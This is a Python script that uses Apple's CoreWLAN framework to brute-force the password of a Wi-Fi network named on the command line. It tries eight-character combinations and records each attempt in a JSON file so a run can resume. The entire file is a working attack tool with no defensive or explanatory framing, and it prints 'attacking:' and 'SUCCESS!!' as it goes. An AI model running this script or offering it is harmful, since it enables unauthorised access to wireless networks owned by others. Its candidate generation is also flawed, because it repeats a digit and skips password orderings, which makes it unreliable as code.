import objc
import itertools
import argparse
import json
import os.path

characters = '01234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*'
# assumption is that most ppl are lazy
# and use bare minimum of symbols
# to create a wifi pass, which is 8
password_length = 8

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument('--atk', metavar='N', type=str, nargs='+',
                   help='an integer for the accumulator')

args = parser.parse_args()

atkWifiName = args.atk and args.atk.pop() or 'fuchi'

objc.loadBundle('CoreWLAN',
                bundle_path = '/System/Library/Frameworks/CoreWLAN.framework',
                module_globals = globals())

iface = CWInterface.interface()

print ('attacking: ' + atkWifiName)

networks, error = iface.scanForNetworksWithName_includeHidden_error_(atkWifiName,True, None)

def check_password(network, password):
  print("checking:" + password)
  success, error = iface.associateToNetwork_password_error_(network, password, None)

  if success:
    print("SUCCESS!!:" + password)
    print(success)
    return True
  else:
    print("Nope :| " + password)

  return False

if (networks != None):
  network = networks.anyObject()
  if (network != None):
    jsonPasObj = {}
    if(os.path.isfile(atkWifiName+'.json')):
      with open(atkWifiName+".json") as data_file:
        jsonPasObj = json.loads(data_file.read())

    gen = itertools.combinations_with_replacement(characters,password_length)

    for password in gen:
        pswd = ''.join(password)

        if pswd in jsonPasObj:
          continue

        if check_password(network,pswd):
          jsonPasObj[pswd] = 'success'
          with open(atkWifiName+".json", 'w') as outfile:
            json.dump(jsonPasObj, outfile)
          break
        else:
          jsonPasObj[pswd] = 'fail'
          with open(atkWifiName+".json", 'w') as outfile:
            json.dump(jsonPasObj, outfile)
  else:
    print("Not network named: " + atkWifiName)

  print ("I cannot believe it, but we are done :|")
else:
  print("Not networkss named: " + atkWifiName)
